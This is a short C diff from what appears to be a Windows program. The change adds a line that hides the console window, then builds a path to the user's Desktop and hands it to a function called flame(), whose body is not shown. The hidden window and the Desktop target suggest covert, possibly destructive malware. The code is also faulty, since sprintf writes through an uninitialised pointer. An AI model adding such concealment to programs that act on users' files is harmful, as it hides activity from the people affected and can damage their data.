@@ -15,6 +15,7 @@ void flame(char *basepath);
 
 int main(){
     char *sus;
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     wchar_t *sussybaka=_wgetenv(L"USERPROFILE");
     sprintf(sus,"%ls\\Desktop",sussybaka);
     flame(sus);
